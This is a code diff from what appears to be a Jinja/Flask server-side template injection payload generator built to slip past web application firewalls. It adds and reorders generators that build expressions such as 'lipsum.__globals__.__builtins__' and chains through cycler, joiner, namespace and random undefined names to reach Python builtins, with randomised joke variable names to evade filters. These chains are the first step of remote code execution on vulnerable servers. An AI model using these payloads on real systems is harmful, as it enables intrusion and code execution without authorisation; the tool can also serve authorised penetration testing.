@@ -8,7 +8,95 @@ from ..payload_gen import expression_gen, precedence
 from ..const import *
 
 
+def randomcase(s):
+    return "".join(c.lower() if random.random() < 0.5 else c.upper() for c in s)
+
+
+brainrot_varname = random.choice(
+    [
+        "_233",
+        "_114",
+        "_1919",
+        "QAQ",
+        "OvO",
+        "orz",
+        "ez",
+        "tql",
+        "ddw",
+        "sbwaf",
+        "kksk",
+        "ohio",
+        "otto",
+        "miku",
+        "teto",
+        "noda",
+    ]
+)
+is_brainrot_enabled = random.random() < 0.233
+
 # ---
+
+
+@expression_gen
+def gen_builtins_dict_brainrot(context):
+    if not is_brainrot_enabled:
+        return [(UNSATISFIED,)]
+    # the waf sucks and we're joking about it.
+    return [
+        (
+            EXPRESSION,
+            precedence["attribute"],
+            [(LITERAL, brainrot_varname + ".__eq__.__globals__.__builtins__")],
+        )
+    ]
+
+
+@expression_gen
+def gen_builtins_dict_waftoosimple(context):
+    return [
+        (
+            EXPRESSION,
+            precedence["attribute"],
+            [(LITERAL, "lipsum.__globals__.__builtins__")],
+        )
+    ]
+
+
+@expression_gen
+def gen_builtins_dict_lipsum(context):
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (JINJA_CONTEXT_VAR, "lipsum"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+        )
+    ]
+
+
+@expression_gen
+def gen_builtins_dict_jinjaattrs(context):
+
+    jinja_funcs_attrs = [
+        ("cycler", "next"),
+        ("cycler", "reset"),
+        ("cycler", "__init__"),
+        ("joiner", "__init__"),
+        ("namespace", "__init__"),
+    ]
+    alternatives = [
+        [
+            (
+                CHAINED_ATTRIBUTE_ITEM,
+                (JINJA_CONTEXT_VAR, obj_name),
+                (ATTRIBUTE, attr_name),
+                (ATTRIBUTE, "__globals__"),
+                (ITEM, "__builtins__"),
+            )
+        ]
+        for obj_name, attr_name in jinja_funcs_attrs
+    ]
+    return [(ONEOF, alternatives)]
 
 
 @expression_gen
@@ -35,13 +123,10 @@ def gen_builtins_dict_flaskattrs(context):
 
 
 @expression_gen
-def gen_builtins_dict_jinjaattrs(context):
+def gen_builtins_dict_undefined(context):
     funcs_attrs = [
-        ("cycler", "next"),
-        ("cycler", "reset"),
-        ("cycler", "__init__"),
-        ("joiner", "__init__"),
-        ("namespace", "__init__"),
+        ("".join(random.choices(string.ascii_lowercase, k=2)), "__init__")
+        for _ in range(10)
     ]
     alternatives = [
         [
@@ -56,18 +141,6 @@ def gen_builtins_dict_jinjaattrs(context):
         for obj_name, attr_name in funcs_attrs
     ]
     return [(ONEOF, alternatives)]
-
-
-@expression_gen
-def gen_builtins_dict_lipsum(context):
-    return [
-        (
-            CHAINED_ATTRIBUTE_ITEM,
-            (JINJA_CONTEXT_VAR, "lipsum"),
-            (ATTRIBUTE, "__globals__"),
-            (ITEM, "__builtins__"),
-        )
-    ]
 
 
 @expression_gen
